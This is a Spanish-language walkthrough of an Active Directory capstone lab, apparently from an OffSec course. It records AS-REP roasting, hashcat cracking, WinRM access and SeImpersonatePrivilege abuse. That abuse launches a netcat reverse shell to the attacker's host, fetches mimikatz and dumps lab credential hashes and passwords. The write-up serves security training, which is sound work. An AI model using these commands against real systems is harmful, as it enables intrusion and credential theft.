# Walk: Attacking Active Directory Authentication - VM Group 2

## Fecha: 04/07/2025
## Objetivo
Capstone Exercise: Once VM Group 2 is started, the domain corp.com has been modified. 
Use the techniques from this Module to obtain access to the user account maria and log in to the domain controller. 
To perform the initial enumeration steps you can use pete with the password Nexus123!. 
You'll find the flag on the Desktop of the domain administrator on DC1. 
If you obtain a hash to crack, create and utilize a rule file which adds nothing, a "1", or a "!" to the passwords of rockyou.txt.
## Herramientas
1. impacket-GetNPUsers 

## Procedimiento y comandos

#### Paso 1: Entramos como `pete` y enumeramos:

* Archivo Command.txt
```powershell
PS C:\Users\pete> dir


    Directory: C:\Users\pete


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         9/12/2022   9:25 AM                3D Objects
d-r---         9/12/2022   9:25 AM                Contacts
d-r---         9/12/2022   9:25 AM                Desktop
d-r---         9/12/2022   9:25 AM                Documents
d-r---         9/12/2022   9:25 AM                Downloads
d-r---         9/12/2022   9:25 AM                Favorites
d-r---         9/12/2022   9:25 AM                Links
d-r---         9/12/2022   9:25 AM                Music
d-r---         9/12/2022   9:25 AM                Pictures
d-r---         9/12/2022   9:25 AM                Saved Games
d-r---         9/12/2022   9:25 AM                Searches
d-r---         9/12/2022   9:25 AM                Videos
-a----         9/12/2022   9:26 AM            184 command.txt


PS C:\Users\pete> type command.txt
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369-1105 /domain:corp.com /ptt /target:client75.corp.com /service:cifs /rc4:b57715dcb5b529f212a9a4effd03aaf6 /user:jeffadmin
PS C:\Users\pete>
```

* Subimos SharpHound

```powershell
PS C:\Tools> Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\pete\"
```
* Obtenemos el archivo:

```powershell

```
* Propagamos las credenciales con crackmapexec:
```bash
┌──(root㉿kali)-[/home/…/OffSec/23-ActiveDirectory-Attacks/Capstones/lab-1]
└─# crackmapexec smb 192.168.111.70-76 -u pete -p 'Nexus123!'
SMB         192.168.111.72  445    WEB04            [*] Windows Server 2022 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.111.74  445    CLIENT74         [*] Windows 11 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.111.70  445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
SMB         192.168.111.73  445    FILES04          [*] Windows Server 2022 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.111.72  445    WEB04            [+] corp.com\pete:Nexus123! 
SMB         192.168.111.74  445    CLIENT74         [+] corp.com\pete:Nexus123! 
SMB         192.168.111.70  445    DC1              [+] corp.com\pete:Nexus123! 
SMB         192.168.111.73  445    FILES04          [+] corp.com\pete:Nexus123! 
```

#### Paso 2: Intentamos ataques:

* Lo que hace este comando:

```bash
┌──(root㉿kali)-[/home/…/OffSec/23-ActiveDirectory-Attacks/Capstones/lab-1]
└─# impacket-GetNPUsers -dc-ip 192.168.230.70 -request -outputfile hashes.asreproast corp.com/pete
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
----  ----------------------------------------  --------------------------  --------------------------  --------
mike                                            2025-07-07 09:23:17.595712  <never>                     0x400200 
dave  CN=Development Department,DC=corp,DC=com  2025-07-07 09:23:16.736333  2025-07-07 10:14:28.423840  0x410200 



/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$mike@CORP.COM:0fa8075f459f3c7035d1e7312e809de2$60fcd9672f558b40e2cc9aade420bf8e823e86111c14d8dc2f9e628e1dbfa465abbf37b742e23816e981f4ed00a4251627350a7219ccf0cea9b5a5c40934f077c8a2c47230c3ffc06772b2f3f517ba2ed1f0e8ed70dd6b2020666da9f1ddb150923c217eb87038df87f6a2e69517505bfbe9c8c765268aaf15165d004d9bc8f1c331932338c007df9826d68a7aa9506a8f245ee03dbd67ee3282406ca958ea8c343b23c3fbfb2ca840577f263904221a2be6c7340bdf82274fdf79f06c5c71274f63c60e582465d0d882f93f3562798883e57d3e073bd69c6f8cb9d00556fb9b8682a7e7
$krb5asrep$23$dave@CORP.COM:38720473c5f472ee5aacf6b6537f7337$e0ca6eeff8183e2373e455f659d08988e79f41f4b0c41be5251bd411d02ca84e21dafd72a8e7c2e1ba0c48d03af6fed66550fb7eebf549661f00067df60d263c3afe9687a47d14a739e4db1511f5017bceffddb1d1726a31df1162d9721e8b4933f3bce3e89cb46743a03fd22c45bb6c92a06ccfb16b909bfa83915c249c57dfbe7a07398aa687be36ba1e5e60314e93bfafa6bd7d4b05bd04282175ba014526eb567f1efae370bbd869cc57a3c1e429e048261e2662cd97a8f40c472b92e86e9c8a09b9e6e2dd7f8066af5efe819d2d213802b1921773f1e0c661cf3e67d39f31bd598c
```
* Resultado:

```bash
┌──(root㉿kali)-[/home/…/OffSec/23-ActiveDirectory-Attacks/Capstones/lab-1]
└─# cat hashes.asreproast                                      
$krb5asrep$23$mike@CORP.COM:0fa8075f459f3c7035d1e7312e809de2$60fcd9672f558b40e2cc9aade420bf8e823e86111c14d8dc2f9e628e1dbfa465abbf37b742e23816e981f4ed00a4251627350a7219ccf0cea9b5a5c40934f077c8a2c47230c3ffc06772b2f3f517ba2ed1f0e8ed70dd6b2020666da9f1ddb150923c217eb87038df87f6a2e69517505bfbe9c8c765268aaf15165d004d9bc8f1c331932338c007df9826d68a7aa9506a8f245ee03dbd67ee3282406ca958ea8c343b23c3fbfb2ca840577f263904221a2be6c7340bdf82274fdf79f06c5c71274f63c60e582465d0d882f93f3562798883e57d3e073bd69c6f8cb9d00556fb9b8682a7e7
$krb5asrep$23$dave@CORP.COM:38720473c5f472ee5aacf6b6537f7337$e0ca6eeff8183e2373e455f659d08988e79f41f4b0c41be5251bd411d02ca84e21dafd72a8e7c2e1ba0c48d03af6fed66550fb7eebf549661f00067df60d263c3afe9687a47d14a739e4db1511f5017bceffddb1d1726a31df1162d9721e8b4933f3bce3e89cb46743a03fd22c45bb6c92a06ccfb16b909bfa83915c249c57dfbe7a07398aa687be36ba1e5e60314e93bfafa6bd7d4b05bd04282175ba014526eb567f1efae370bbd869cc57a3c1e429e048261e2662cd97a8f40c472b92e86e9c8a09b9e6e2dd7f8066af5efe819d2d213802b1921773f1e0c661cf3e67d39f31bd598c
```
* Creamos archivo de reglas:

```bash
:
$1
$!
```

* Crackeamos:
```bash
┌──(root㉿kali)-[/home/…/OffSec/23-ActiveDirectory-Attacks/Capstones/lab-1]
└─# hashcat -m 18200 -a 0 -r rules.rule hashes.asreproast /usr/share/wordlists/rockyou.txt -o cracked_asrep.txt
```
- Resltados:
```bash
┌──(root㉿kali)-[/home/…/OffSec/23-ActiveDirectory-Attacks/Capstones/lab-1]
└─# cat cracked_asrep.txt 
$krb5asrep$23$mike@CORP.COM:0fa8075f459f3c7035d1e7312e809de2$60fcd9672f558b40e2cc9aade420bf8e823e86111c14d8dc2f9e628e1dbfa465abbf37b742e23816e981f4ed00a4251627350a7219ccf0cea9b5a5c40934f077c8a2c47230c3ffc06772b2f3f517ba2ed1f0e8ed70dd6b2020666da9f1ddb150923c217eb87038df87f6a2e69517505bfbe9c8c765268aaf15165d004d9bc8f1c331932338c007df9826d68a7aa9506a8f245ee03dbd67ee3282406ca958ea8c343b23c3fbfb2ca840577f263904221a2be6c7340bdf82274fdf79f06c5c71274f63c60e582465d0d882f93f3562798883e57d3e073bd69c6f8cb9d00556fb9b8682a7e7:Darkness1099!
```
- Pass: `Darkness1099!`

#### Paso 3: Propagacion de credenciales:
* winrm

```bash
┌──(root㉿kali)-[/home/…/OffSec/23-ActiveDirectory-Attacks/Capstones/lab-1]
└─# crackmapexec winrm 192.168.230.70-76 -u mike -p 'Darkness1099!'
SMB         192.168.230.70  5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:corp.com)
SMB         192.168.230.73  5985   FILES04          [*] Windows Server 2022 Build 20348 (name:FILES04) (domain:corp.com)
HTTP        192.168.230.70  5985   DC1              [*] http://192.168.230.70:5985/wsman
SMB         192.168.230.75  5985   CLIENT75         [*] Windows 11 Build 22000 (name:CLIENT75) (domain:corp.com)
SMB         192.168.230.72  5985   WEB04            [*] Windows Server 2022 Build 20348 (name:WEB04) (domain:corp.com)
SMB         192.168.230.74  5985   CLIENT74         [*] Windows 11 Build 22000 (name:CLIENT74) (domain:corp.com)
HTTP        192.168.230.73  5985   FILES04          [*] http://192.168.230.73:5985/wsman
HTTP        192.168.230.75  5985   CLIENT75         [*] http://192.168.230.75:5985/wsman
HTTP        192.168.230.74  5985   CLIENT74         [*] http://192.168.230.74:5985/wsman
HTTP        192.168.230.72  5985   WEB04            [*] http://192.168.230.72:5985/wsman
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.230.70  5985   DC1              [-] corp.com\mike:Darkness1099!
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.230.73  5985   FILES04          [-] corp.com\mike:Darkness1099!
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.230.75  5985   CLIENT75         [+] corp.com\mike:Darkness1099! (Pwn3d!)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.230.74  5985   CLIENT74         [-] corp.com\mike:Darkness1099!
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.230.72  5985   WEB04            [-] corp.com\mike:Darkness1099!
```
* SMB

```bash

```
#### Paso 4: Entramos con evil-winrm a client75:
```bash
┌──(root㉿kali)-[/home/…/OffSec/23-ActiveDirectory-Attacks/Capstones/lab-1]
└─# evil-winrm -i 192.168.230.75 -u 'mike' -p 'Darkness1099!' -P 5985

*Evil-WinRM* PS C:\Users\mike> whoami /priv
                                                                                                                             
PRIVILEGES INFORMATION                                                                                                       
----------------------                                                                                                       
                                                                                                                             
Privilege Name                            Description                                                        State           
========================================= ================================================================== =======         
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled         
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled         
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled         
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled         
SeSystemProfilePrivilege                  Profile system performance                                         Enabled         
SeSystemtimePrivilege                     Change the system time                                             Enabled         
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled         
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled         
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled         
SeBackupPrivilege                         Back up files and directories                                      Enabled         
SeRestorePrivilege                        Restore files and directories                                      Enabled         
SeShutdownPrivilege                       Shut down the system                                               Enabled         
SeDebugPrivilege                          Debug programs                                                     Enabled         
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled         
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled         
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled         
SeUndockPrivilege                         Remove computer from docking station                               Enabled         
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled         
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled         
SeCreateGlobalPrivilege                   Create global objects                                              Enabled         
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled         
SeTimeZonePrivilege                       Change the time zone                                               Enabled         
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled         
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled         
*Evil-WinRM* PS C:\Users\mike>
```

* Atacamos el privilegio **SeImpersonatePrivilege**

```bash
*Evil-WinRM* PS C:\Users\mike> .\ps.exe -c "C:\Users\mike\nc.exe 192.168.45.213 1234 -e cmd"
[+] Found privilege: SeImpersonatePrivilege                                                           
[+] Named pipe listening...                                                                           
[-] Operation failed or timed out.                                                                    
*Evil-WinRM* PS C:\Users\mike> .\ps.exe -c "C:\Users\mike\nc.exe 192.168.45.213 1234 -e cmd"
[+] Found privilege: SeImpersonatePrivilege                                                           
[+] Named pipe listening...                                                                           
[-] Operation failed or timed out.                                                                    
*Evil-WinRM* PS C:\Users\mike> Get-Service -Name spooler
                                                                                                      
Status   Name               DisplayName                                                               
------   ----               -----------                                                               
Stopped  spooler            Print Spooler                                                             
                                                                                                      
                                                                                                      
*Evil-WinRM* PS C:\Users\mike> Start-Service -Name spooler
Service 'Print Spooler (spooler)' cannot be started due to the following error: Cannot start service spooler on computer '.'.                                                                               
At line:1 char:1                                                                                      
+ Start-Service -Name spooler                                                                         
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                         
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service], ServiceCommandException                                                               
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand  
*Evil-WinRM* PS C:\Users\mike> Get-WmiObject -Class Win32_Service -Filter "Name='spooler'" | Select-Object Name, StartMode, State, Status

Name    StartMode State   Status                                                                      
----    --------- -----   ------                                                                      
Spooler Disabled  Stopped OK                                                                          
                                                                                                      
                                                                                                      
*Evil-WinRM* PS C:\Users\mike> Set-Service -Name spooler -StartupType Automatic
*Evil-WinRM* PS C:\Users\mike> Start-Service -Name spooler
*Evil-WinRM* PS C:\Users\mike> .\ps.exe -c "C:\Users\mike\nc.exe 192.168.45.213 1234 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...                                                                           
[+] CreateProcessAsUser() OK                                                                          
*Evil-WinRM* PS C:\Users\mike> 

```

* Receptor:
```bash
┌──(root㉿kali)-[/home/…/OffSec/23-ActiveDirectory-Attacks/Capstones/lab-1]
└─# nc -lvnp 1234                                               
listening on [any] 1234 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.230.75] 57324
Microsoft Windows [Version 10.0.22000.856]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Users\Administrator>powershell

PS C:\Users\Administrator> powershell -ep bypass

PS C:\Users\Administrator> iwr -uri http://192.168.45.213:8000/mimikatz.exe -Outfile mimi.exe
iwr -uri http://192.168.45.213:8000/mimikatz.exe -Outfile mimi.exe
PS C:\Users\Administrator> .\mimi.exe
.\mimi.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK                                                                                                                                                                                                 
                                                                                                                                                                                                                  
mimikatz # sekurlsa::logonpasswords                                                                                                                                                                               
                                                                                                                                                                                                                  
Authentication Id : 0 ; 1211073 (00000000:00127ac1)                                                                                                                                                               
Session           : Service from 0                                                                                                                                                                                
User Name         : maria                                                                                                                                                                                         
Domain            : CORP                                                                                                                                                                                          
Logon Server      : DC1                                                                                                                                                                                           
Logon Time        : 7/7/2025 5:23:35 AM                                                                                                                                                                           
SID               : S-1-5-21-1987370270-658905905-1781884369-22102                                                                                                                                                
        msv :                                                                                                                                                                                                     
         [00000003] Primary                                                                                                                                                                                       
         * Username : maria                                                                                                                                                                                       
         * Domain   : CORP                                                                                                                                                                                        
         * NTLM     : 2a944a58d4ffa77137b2c587e6ed7626                                                                                                                                                            
         * SHA1     : 334214b2b9e5e6059269ca4e9cb5b16cf779dc07                                                                                                                                                    
         * DPAPI    : 49e3867770762547715227fab20efcc6                                                                                                                                                            
        tspkg :                                                                                                                                                                                                   
        wdigest :                                                                                                                                                                                                 
         * Username : maria                                                                                                                                                                                       
         * Domain   : CORP                                                                                                                                                                                        
         * Password : (null)                                                                                                                                                                                      
        kerberos :                                                                                                                                                                                                
         * Username : maria                                                                                                                                                                                       
         * Domain   : CORP.COM                                                                                                                                                                                    
         * Password : (null)                                                                                                                                                                                      
        ssp :                                                                                                                                                                                                     
        credman :                                                                                                                                                                                                 
        cloudap :       KO                                                                                                                                                                                        
                                                                                                                                                                                                                  
Authentication Id : 0 ; 702720 (00000000:000ab900)                                                                                                                                                                
Session           : Batch from 0                                                                                                                                                                                  
User Name         : offsec                                                                                                                                                                                        
Domain            : CLIENT75                                                                                                                                                                                      
Logon Server      : CLIENT75                                                                                                                                                                                      
Logon Time        : 3/29/2024 5:05:32 PM                                                                                                                                                                          
SID               : S-1-5-21-3361712080-4014456659-608320044-1001                                                                                                                                                 
        msv :                                                                                                                                                                                                     
         [00000003] Primary                                                                                                                                                                                       
         * Username : offsec                                                                                                                                                                                      
         * Domain   : CLIENT75                                                                                                                                                                                    
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e                                                                                                                                                            
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3                                                                                                                                                    
        tspkg :                                                                                                                                                                                                   
        wdigest :                                                                                                                                                                                                 
         * Username : offsec                                                                                                                                                                                      
         * Domain   : CLIENT75                                                                                                                                                                                    
         * Password : (null)                                                                                                                                                                                      
        kerberos :                                                                                                                                                                                                
         * Username : offsec                                                                                                                                                                                      
         * Domain   : CLIENT75                                                                                                                                                                                    
         * Password : (null)                                                                                                                                                                                      
        ssp :                                                                                                                                                                                                     
        credman :
        cloudap :       KO

Authentication Id : 0 ; 484244 (00000000:00076394)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 3/29/2024 5:04:28 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : Flowers1
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 3/29/2024 5:03:43 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 77392 (00000000:00012e50)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/29/2024 5:03:40 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : CLIENT75$
         * Domain   : CORP
         * NTLM     : 83582e1d6c859ac47dc703bbe72bfe73
         * SHA1     : d6c9d9a50c2e171b540c2efaaea90630e6060392
        tspkg :
        wdigest :
         * Username : CLIENT75$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : CLIENT75$
         * Domain   : corp.com
         * Password : c2 ec 3b 98 2d 77 e4 18 44 fc 2b 2d 01 8e ab 44 fe 67 7f 6f d3 3e ba 9f 08 88 d1 26 4e 6a f1 a6 ec a7 2e 8a e8 d8 87 97 fe 97 8a 34 ff 6e 8b a8 7e a3 35 10 4d 74 a9 95 36 28 13 2d 3f d9 a0 91 82 5e 3d aa fd 4f 6f e2 53 58 72 ec 8b 53 a4 cc 72 3f bb c8 81 4a 5e 12 71 77 8d f6 c1 66 23 ed 89 07 1e 39 e1 ea 7d 8f 78 56 60 96 c6 25 b9 0e 3a c6 28 1f 01 6d 13 e8 9f 8c 23 57 24 c2 31 cd 89 7b fe 06 18 1a 7a 8a 91 1f 68 4b 55 12 cb ec af 30 76 ae c8 28 61 69 84 64 4d f4 23 a8 56 dd 8f b2 62 01 8f bd aa 43 43 de 53 fa 95 0d 6b 05 11 93 d2 96 9f 31 b5 af e8 06 69 24 a8 ae e0 57 72 9f 0d 3b 06 5d 3f 67 4b b7 f3 9d b4 f6 0f 2c 2c 88 30 6e df 43 5c ea 13 1f c9 6b be b6 bb ce d1 ae 33 73 8c be f2 db 9d 4d 45 cd 2b 8e 77 b2 
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 77373 (00000000:00012e3d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/29/2024 5:03:40 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : CLIENT75$
         * Domain   : CORP
         * NTLM     : 3bd808a824c6b66d542424b4df6aea88
         * SHA1     : 49a1f55040e2d88949b867622399477ba5fd69ea
        tspkg :
        wdigest :
         * Username : CLIENT75$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : CLIENT75$
         * Domain   : corp.com
         * Password : 9d 1d a0 59 a1 29 6b 6c 1d 00 0a 0a 3b 2a a1 d5 3c d6 aa aa ef 97 dd 9e b6 ca da 3e 3f a8 98 3e ba b5 40 73 c0 75 19 46 0c 7b e4 dd 5b b5 e1 6b ae 9e bd 25 38 d7 50 9f 00 57 3b 97 9d 6c 37 1f 06 52 82 85 82 4a a7 d0 d1 8a dd b2 3b 7f 23 7d 70 51 80 7c d4 41 48 79 f4 e9 33 2f 3a f2 b5 51 e5 eb 1e 4d 89 29 db 64 bc 57 83 de 2d d3 d4 ea aa 88 26 24 e1 3e 73 11 71 26 d8 c5 53 e5 4c 4a 2f 8a 47 57 f6 2f 17 7c 96 33 31 f0 dd 46 dc 5a e2 e3 9c 52 37 c5 46 20 0c 6b 9b b4 2f c5 22 1a 3e fe 58 6b e1 6a 21 b2 f2 04 b1 e1 a0 fa 00 03 18 0f dd 72 92 f9 5e 6f 46 2b df 34 1b 90 be cf d7 d9 c2 dd 1f 9b e0 73 bd 42 e9 38 24 91 13 0e 48 bf 44 2b 0e 6f 61 71 08 37 35 eb 1d ba 36 5b c7 96 4f dc 0b 15 8c 66 57 41 19 b2 66 61 7d 57 
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CLIENT75$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 3/29/2024 5:03:39 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : CLIENT75$
         * Domain   : CORP
         * NTLM     : 3bd808a824c6b66d542424b4df6aea88
         * SHA1     : 49a1f55040e2d88949b867622399477ba5fd69ea
        tspkg :
        wdigest :
         * Username : CLIENT75$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : client75$
         * Domain   : CORP.COM
         * Password : 9d 1d a0 59 a1 29 6b 6c 1d 00 0a 0a 3b 2a a1 d5 3c d6 aa aa ef 97 dd 9e b6 ca da 3e 3f a8 98 3e ba b5 40 73 c0 75 19 46 0c 7b e4 dd 5b b5 e1 6b ae 9e bd 25 38 d7 50 9f 00 57 3b 97 9d 6c 37 1f 06 52 82 85 82 4a a7 d0 d1 8a dd b2 3b 7f 23 7d 70 51 80 7c d4 41 48 79 f4 e9 33 2f 3a f2 b5 51 e5 eb 1e 4d 89 29 db 64 bc 57 83 de 2d d3 d4 ea aa 88 26 24 e1 3e 73 11 71 26 d8 c5 53 e5 4c 4a 2f 8a 47 57 f6 2f 17 7c 96 33 31 f0 dd 46 dc 5a e2 e3 9c 52 37 c5 46 20 0c 6b 9b b4 2f c5 22 1a 3e fe 58 6b e1 6a 21 b2 f2 04 b1 e1 a0 fa 00 03 18 0f dd 72 92 f9 5e 6f 46 2b df 34 1b 90 be cf d7 d9 c2 dd 1f 9b e0 73 bd 42 e9 38 24 91 13 0e 48 bf 44 2b 0e 6f 61 71 08 37 35 eb 1d ba 36 5b c7 96 4f dc 0b 15 8c 66 57 41 19 b2 66 61 7d 57 
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 47122 (00000000:0000b812)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/29/2024 5:03:39 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : CLIENT75$
         * Domain   : CORP
         * NTLM     : 3bd808a824c6b66d542424b4df6aea88
         * SHA1     : 49a1f55040e2d88949b867622399477ba5fd69ea
        tspkg :
        wdigest :
         * Username : CLIENT75$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : CLIENT75$
         * Domain   : corp.com
         * Password : 9d 1d a0 59 a1 29 6b 6c 1d 00 0a 0a 3b 2a a1 d5 3c d6 aa aa ef 97 dd 9e b6 ca da 3e 3f a8 98 3e ba b5 40 73 c0 75 19 46 0c 7b e4 dd 5b b5 e1 6b ae 9e bd 25 38 d7 50 9f 00 57 3b 97 9d 6c 37 1f 06 52 82 85 82 4a a7 d0 d1 8a dd b2 3b 7f 23 7d 70 51 80 7c d4 41 48 79 f4 e9 33 2f 3a f2 b5 51 e5 eb 1e 4d 89 29 db 64 bc 57 83 de 2d d3 d4 ea aa 88 26 24 e1 3e 73 11 71 26 d8 c5 53 e5 4c 4a 2f 8a 47 57 f6 2f 17 7c 96 33 31 f0 dd 46 dc 5a e2 e3 9c 52 37 c5 46 20 0c 6b 9b b4 2f c5 22 1a 3e fe 58 6b e1 6a 21 b2 f2 04 b1 e1 a0 fa 00 03 18 0f dd 72 92 f9 5e 6f 46 2b df 34 1b 90 be cf d7 d9 c2 dd 1f 9b e0 73 bd 42 e9 38 24 91 13 0e 48 bf 44 2b 0e 6f 61 71 08 37 35 eb 1d ba 36 5b c7 96 4f dc 0b 15 8c 66 57 41 19 b2 66 61 7d 57 
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 47106 (00000000:0000b802)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/29/2024 5:03:39 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : CLIENT75$
         * Domain   : CORP
         * NTLM     : 3bd808a824c6b66d542424b4df6aea88
         * SHA1     : 49a1f55040e2d88949b867622399477ba5fd69ea
        tspkg :
        wdigest :
         * Username : CLIENT75$
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : CLIENT75$
         * Domain   : corp.com
         * Password : 9d 1d a0 59 a1 29 6b 6c 1d 00 0a 0a 3b 2a a1 d5 3c d6 aa aa ef 97 dd 9e b6 ca da 3e 3f a8 98 3e ba b5 40 73 c0 75 19 46 0c 7b e4 dd 5b b5 e1 6b ae 9e bd 25 38 d7 50 9f 00 57 3b 97 9d 6c 37 1f 06 52 82 85 82 4a a7 d0 d1 8a dd b2 3b 7f 23 7d 70 51 80 7c d4 41 48 79 f4 e9 33 2f 3a f2 b5 51 e5 eb 1e 4d 89 29 db 64 bc 57 83 de 2d d3 d4 ea aa 88 26 24 e1 3e 73 11 71 26 d8 c5 53 e5 4c 4a 2f 8a 47 57 f6 2f 17 7c 96 33 31 f0 dd 46 dc 5a e2 e3 9c 52 37 c5 46 20 0c 6b 9b b4 2f c5 22 1a 3e fe 58 6b e1 6a 21 b2 f2 04 b1 e1 a0 fa 00 03 18 0f dd 72 92 f9 5e 6f 46 2b df 34 1b 90 be cf d7 d9 c2 dd 1f 9b e0 73 bd 42 e9 38 24 91 13 0e 48 bf 44 2b 0e 6f 61 71 08 37 35 eb 1d ba 36 5b c7 96 4f dc 0b 15 8c 66 57 41 19 b2 66 61 7d 57 
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 45348 (00000000:0000b124)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 3/29/2024 5:03:39 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : CLIENT75$
         * Domain   : CORP
         * NTLM     : 3bd808a824c6b66d542424b4df6aea88
         * SHA1     : 49a1f55040e2d88949b867622399477ba5fd69ea
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :
        cloudap :       KO

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : CLIENT75$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 3/29/2024 5:03:39 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : CLIENT75$
         * Domain   : CORP
         * Password : (null)
